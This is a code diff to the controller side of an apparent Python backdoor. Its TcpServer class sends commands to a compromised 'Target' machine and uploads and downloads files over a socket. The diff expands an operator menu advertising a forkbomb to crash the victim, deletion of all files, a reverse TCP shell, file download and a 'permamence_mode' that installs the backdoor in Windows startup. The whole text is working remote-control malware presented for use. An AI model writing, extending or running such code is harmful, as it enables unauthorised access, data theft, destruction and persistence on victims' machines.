@@ -199,11 +199,11 @@ class TcpServer:
                     if message_command.startswith("upload "):
                         try:
                             location_filename = message_command.split(" ")[1]
-                            self.client.send(message_command.encode())
+                            self.client.send(message_command.encode("latin1"))
                         
                         
-                            up_data = os.path.getsize(location_filename)
-                            self.client.send(str(up_data).encode("utf-8"))
+                            data = os.path.getsize(location_filename)
+                            self.client.send(str(data).encode("utf-8"))
 
                             with open(location_filename,"rb") as up:
                                 up_filedata = up.read()
@@ -211,7 +211,6 @@ class TcpServer:
 
                             transference_done = self.client.recv(1024).decode()
                             print(transference_done)
-
                             continue
                         except IsADirectoryError:
                             print("\033[0;31m[!]\033[0;0m - Incorrect file type, Need to especify a file! Backing to input...")
@@ -219,6 +218,8 @@ class TcpServer:
                         except:
                             print("SOmething went wrong! Going back to the input...")
                             continue
+                        
+                        
                     
 
                     # Downloading files
@@ -247,6 +248,7 @@ class TcpServer:
 
                             print(f"\033[1;32m[+]\033[0;0m - Download to {file_name} finished! File Size: {str(int_screenshot_size)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
                             continue
+
                         except IsADirectoryError:
                             print("The Target's file is A directory!")
                             continue
@@ -264,23 +266,21 @@ class TcpServer:
                             str_cat += self.client.recv(int(cat_size))
                             print(str_cat.decode())
                         continue
-                        
-                           
-
-
-
-
+                    
 
                     # Command listing
 
                     if message_command == "list":
                         print("""
+            ---------------------------------------------
             \033[1;31mforkbomb --> Crash Target's machine
             victims_info --> Get some Target's info
             get_ip --> Get Target's ip
             remove_all --> Removes all files in currently directory
-            reverse_tcp --> NetCat feature: Spawn Reverse TCP shell into specified IP and PORT\033[0;0m
-                        """)
+            reverse_tcp --> NetCat feature: Spawn Reverse TCP shell into specified IP and PORT
+            download <file> --> Download files
+            permamence_mode --> Make Backdoor to initiate in windows startup \033[0;0m
+            ---------------------------------------------            """)
                         continue
 
                     if message_command == "":
@@ -295,13 +295,14 @@ class TcpServer:
                     if message_command == "clear"and sys.platform.startswith("Windows") == True:
                         subprocess.Popen(f"cls", stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
                         continue
-                                
-                    message_command_encrypted = message_command.encode()
-                    self.client.send(message_command_encrypted)
-                    print('* Command sent!')
-                    receive_message = self.client.recv(1024)
-                    descrypt_message = receive_message.decode("latin1")
-                    print(f"{descrypt_message}")
+
+                    if message_command.startswith("upload ") == False:
+                        message_command_encrypted = message_command.encode()
+                        self.client.send(message_command_encrypted)
+                        print('* Command sent!')
+                        receive_message = self.client.recv(1024)
+                        descrypt_message = receive_message.decode("latin1")
+                        print(f"{descrypt_message}")
 
                     #if message_command.startswith("cat"):
                         #time.sleep(5)
